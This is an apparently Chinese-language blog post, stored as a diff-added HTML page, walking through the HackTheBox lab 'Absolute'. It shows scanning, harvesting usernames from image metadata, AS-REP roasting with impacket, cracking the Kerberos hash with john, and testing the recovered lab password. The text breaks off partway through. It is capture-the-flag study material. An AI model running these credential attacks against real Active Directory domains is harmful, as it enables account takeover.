@@ -1,0 +1,1166 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Absolute | Ya1orin
+</title>
+<meta name="description" content="HackTheBox篇ADCS系列之Absolute"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Absolute | Ya1orin" />
+  <meta
+    property="og:description"
+    content="HackTheBox篇ADCS系列之Absolute"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/htb-absolute/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2025-03-22T20:11:04&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-11T15:08:58&#43;08:00" /><meta property="article:tag" content="WindowsADCS" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="HTB Absolute"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB Absolute</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#smb服务">SMB服务</a></li>
+    <li><a href="#http服务">HTTP服务</a></li>
+    <li><a href="#as-rep-roasting攻击">AS-REP Roasting攻击</a></li>
+    <li><a href="#再探smb">再探SMB</a></li>
+    <li><a href="#tgt黄金票据伪造">TGT黄金票据伪造</a></li>
+    <li><a href="#看不懂的exe">看不懂的exe</a></li>
+    <li><a href="#bloodhound信息收集">bloodhound信息收集</a></li>
+    <li><a href="#拿下winrm_user">拿下winrm_user？</a></li>
+    <li><a href="#待更新">待更新</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">40</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </a>
+</div>
+<div class="sidebar-social"></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-03-22 20:11:04 &#43;0800 CST" itemprop="datePublished"
+      >2025-03-22</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-11</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><blockquote>
+<p>靶机ip：10.10.11.181</p>
+</blockquote>
+<h1 id="知识点">
+<a class="header-anchor" href="#%e7%9f%a5%e8%af%86%e7%82%b9"></a>
+知识点
+</h1><ul>
+<li>
+<p>AS-REP Roasting攻击</p>
+</li>
+<li>
+<p>TGT黄金票据伪造</p>
+</li>
+</ul>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rustscan -a 10.10.11.181 -u <span class="m">5000</span>
+</span></span><span class="line"><span class="cl">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="o">{}</span>  <span class="o">}</span><span class="p">|</span> <span class="o">{</span> <span class="o">}</span> <span class="p">|</span><span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span><span class="p">|</span>  <span class="sb">`</span><span class="p">|</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> <span class="p">|</span>.-._<span class="o">}</span> <span class="o">}</span> <span class="p">|</span> <span class="p">|</span>  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> <span class="p">|</span><span class="se">\ </span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="sb">`</span>-<span class="s1">&#39; `-&#39;</span><span class="sb">`</span>-----<span class="s1">&#39;`----&#39;</span>  <span class="sb">`</span>-<span class="s1">&#39;  `----&#39;</span>  <span class="sb">`</span>---<span class="s1">&#39; `-&#39;</span>  <span class="sb">`</span>-<span class="s1">&#39;`-&#39;</span> <span class="sb">`</span>-<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">The Modern Day Port Scanner.
+</span></span><span class="line"><span class="cl">________________________________________
+</span></span><span class="line"><span class="cl">: http://discord.skerritt.blog         :
+</span></span><span class="line"><span class="cl">: https://github.com/RustScan/RustScan :
+</span></span><span class="line"><span class="cl"> --------------------------------------
+</span></span><span class="line"><span class="cl">RustScan: Where scanning meets swagging. 😎
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> The config file is expected to be at <span class="s2">&#34;/root/.rustscan.toml&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> Automatically increasing <span class="nb">ulimit</span> value to 5000.
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:53
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:80
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:88
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:135
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:139
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:389
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:445
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:464
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:593
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:636
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:3268
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:3269
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:9389
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:5985
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:47001
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49664
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49665
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49666
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49667
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49674
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49671
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49675
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49679
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49685
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49703
+</span></span><span class="line"><span class="cl">Open 10.10.11.181:49722
+</span></span></code></pre></div><h1 id="smb服务">
+<a class="header-anchor" href="#smb%e6%9c%8d%e5%8a%a1"></a>
+SMB服务
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smbclient -L //10.10.11.181
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Anonymous login successful
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span><span class="line"><span class="cl">do_connect: Connection to 10.10.11.181 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>smb没什么有用的信息</p>
+<h1 id="http服务">
+<a class="header-anchor" href="#http%e6%9c%8d%e5%8a%a1"></a>
+HTTP服务
+</h1><p>静态页面，目录扫描也没拥有的结果，将网站轮播的六张图片下载下来查看一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>1..6<span class="o">}</span><span class="p">;</span><span class="k">do</span> wget http://10.10.11.181/images/hero_<span class="nv">$i</span>.jpg<span class="p">;</span><span class="k">done</span>
+</span></span></code></pre></div><p>使用<code>exiftool</code>工具查看一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">exiftool hero_1.jpg
+</span></span><span class="line"><span class="cl">ExifTool Version Number         : 12.76
+</span></span><span class="line"><span class="cl">File Name                       : hero_1.jpg
+</span></span><span class="line"><span class="cl">Directory                       : .
+</span></span><span class="line"><span class="cl">File Size                       : <span class="m">407</span> kB
+</span></span><span class="line"><span class="cl">File Modification Date/Time     : 2022:06:08 03:45:20+08:00
+</span></span><span class="line"><span class="cl">File Access Date/Time           : 2025:03:25 03:04:05+08:00
+</span></span><span class="line"><span class="cl">File Inode Change Date/Time     : 2025:03:25 03:03:26+08:00
+</span></span><span class="line"><span class="cl">File Permissions                : -rw-r--r--
+</span></span><span class="line"><span class="cl">File Type                       : JPEG
+</span></span><span class="line"><span class="cl">File Type Extension             : jpg
+</span></span><span class="line"><span class="cl">MIME Type                       : image/jpeg
+</span></span><span class="line"><span class="cl">Exif Byte Order                 : Little-endian <span class="o">(</span>Intel, II<span class="o">)</span>
+</span></span><span class="line"><span class="cl">X Resolution                    : <span class="m">72</span>
+</span></span><span class="line"><span class="cl">Y Resolution                    : <span class="m">72</span>
+</span></span><span class="line"><span class="cl">Resolution Unit                 : inches
+</span></span><span class="line"><span class="cl">Artist                          : James Roberts
+</span></span><span class="line"><span class="cl">Y Cb Cr Positioning             : Centered
+</span></span><span class="line"><span class="cl">Quality                         : 60%
+</span></span><span class="line"><span class="cl">XMP Toolkit                     : Image::ExifTool 11.88
+</span></span><span class="line"><span class="cl">Author                          : James Roberts
+</span></span><span class="line"><span class="cl">Creator Tool                    : Adobe Photoshop CC <span class="m">2018</span> Macintosh
+</span></span><span class="line"><span class="cl">Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
+</span></span><span class="line"><span class="cl">Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
+</span></span><span class="line"><span class="cl">Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
+</span></span><span class="line"><span class="cl">Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
+</span></span><span class="line"><span class="cl">DCT Encode Version              : <span class="m">100</span>
+</span></span><span class="line"><span class="cl">APP14 Flags <span class="m">0</span>                   : <span class="o">[</span>14<span class="o">]</span>, Encoded with <span class="nv">Blend</span><span class="o">=</span><span class="m">1</span> downsampling
+</span></span><span class="line"><span class="cl">APP14 Flags <span class="m">1</span>                   : <span class="o">(</span>none<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Color Transform                 : YCbCr
+</span></span><span class="line"><span class="cl">Image Width                     : <span class="m">1900</span>
+</span></span><span class="line"><span class="cl">Image Height                    : <span class="m">1150</span>
+</span></span><span class="line"><span class="cl">Encoding Process                : Baseline DCT, Huffman coding
+</span></span><span class="line"><span class="cl">Bits Per Sample                 : <span class="m">8</span>
+</span></span><span class="line"><span class="cl">Color Components                : <span class="m">3</span>
+</span></span><span class="line"><span class="cl">Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class="o">(</span><span class="m">1</span> 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Image Size                      : 1900x1150
+</span></span><span class="line"><span class="cl">Megapixels                      : 2.2
+</span></span></code></pre></div><p>注意到<code>Author</code>字段有用户名，将每个文件的用户名都保存到<code>name.txt</code>文件中</p>
+<p><strong>正常Author和Artist是都有用户名的，这里查看第二个图片的时候发现没有Artist字段，所以改用Author</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">exiftool *.jpg <span class="p">|</span> grep Author <span class="p">|</span> awk -F<span class="s1">&#39; &#39;</span> <span class="s1">&#39;{print $3&#34; &#34;$4}&#39;</span> &gt; name.txt
+</span></span><span class="line"><span class="cl">James Roberts
+</span></span><span class="line"><span class="cl">Michael Chaffrey
+</span></span><span class="line"><span class="cl">Donald Klay
+</span></span><span class="line"><span class="cl">Sarah Osvald
+</span></span><span class="line"><span class="cl">Jeffer Robinson
+</span></span><span class="line"><span class="cl">Nicole Smith
+</span></span></code></pre></div><p>使用<a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a>工具生成用户名字典</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./username-anarchy -i name.txt &gt; users.txt
+</span></span></code></pre></div><h1 id="as-rep-roasting攻击">
+<a class="header-anchor" href="#as-rep-roasting%e6%94%bb%e5%87%bb"></a>
+AS-REP Roasting攻击
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-GetNPUsers -usersfile users.txt -dc-ip 10.10.11.181 -format john absolute.htb/
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$d</span>.klay@ABSOLUTE.HTB:18530e0c59304e8b5d667ac0cf0efa8a<span class="nv">$ed41890599de622a5cf7808aef24c8272c03a5fb62a14b9de3f987e2f9ecc614fe22d44e7eba318ab44152271b84577844980b33e7b78ed0f9b36ebe43b4a6cc5339ecbef110e6325a4acb9d7661b4db47a609eccf7b13c53f9d1aa710a0220102bed90c8b8ee8c8319b9297d811d6c878cd9fca0e24646d82ac6c9d77b9aaf2b40ed8b9ef0c103166c3be1113daa285fca49a2dcba3dbae9d92cafeb6b7774bbd58982eaec5d712f744a281f2317b491555fcc7d58a8ed4c89d435a488b8e7df5c07d181007c5aeb3bd9c3dbb44bf896e9cdfc57509eeea3e7f76ff3d87a87cd7825e1f82e6f8724f9ba348</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...
+</span></span></code></pre></div><p>找到一个hash，将其保存至hash文件中，使用<code>john</code>爆破</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john <span class="nb">hash</span> --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos <span class="m">5</span> AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">Darkmoonsky248girl <span class="o">(</span><span class="nv">$krb5asrep$d</span>.klay@ABSOLUTE.HTB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:32 DONE <span class="o">(</span>2025-03-25 03:27<span class="o">)</span> 0.03097g/s 348137p/s 348137c/s 348137C/s DarrenCahppell..DarkAngelNinjaHaku
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></div><p>成功得到一组用户名密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: d.klay
+</span></span><span class="line"><span class="cl">password: Darkmoonsky248girl
+</span></span></code></pre></div><h1 id="再探smb">
+<a class="header-anchor" href="#%e5%86%8d%e6%8e%a2smb"></a>
+再探SMB
+</h1><p>使用<code>netexec</code>枚举</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec winrm 10.10.11.181 -u d.klay -p Darkmoonsky248girl
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.181    <span class="m">5985</span>   DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.181    <span class="m">5985</span>   DC               <span class="o">[</span>-<span class="o">]</span> absolute.htb<span class="se">\d</span>.klay:Darkmoonsky248girl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">netexec ldap 10.10.11.181 -u d.klay -p Darkmoonsky248girl
+</span></span><span class="line"><span class="cl">SMB         10.10.11.181    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.181    <span class="m">389</span>    DC               <span class="o">[</span>-<span class="o">]</span> absolute.htb<span class="se">\d</span>.klay:Darkmoonsky248girl
+</span></span><span class="line"><span class="cl">
